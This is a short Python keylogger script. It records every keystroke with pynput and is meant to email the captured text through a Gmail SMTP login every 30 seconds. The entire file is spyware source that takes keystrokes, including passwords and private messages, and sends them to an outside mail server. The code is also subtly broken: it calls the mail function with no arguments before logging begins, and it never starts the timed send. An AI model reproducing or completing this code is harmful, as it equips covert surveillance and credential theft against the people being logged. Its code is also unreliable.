import pynput.keyboard
import smtplib
import threading

log = ""
def callback_function(key):
    global  log
    try:
        log = log + str(key.char)
        #log = log + key.char.encode("utf-8")
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass
    print(log)

def send_email(email,password,mesage):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email, password)
    email_server.sendmail(email,email,mesage)
    email_server.quit()

send_email()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)


def thread_function():
    global log
    send_email("user@gmail.com", "password", log.encode('utf-8'))
    log =""
    timer_object = threading.Timer(30, thread_function)
    timer_object.start()

with keylogger_listener:
    keylogger_listener.join()
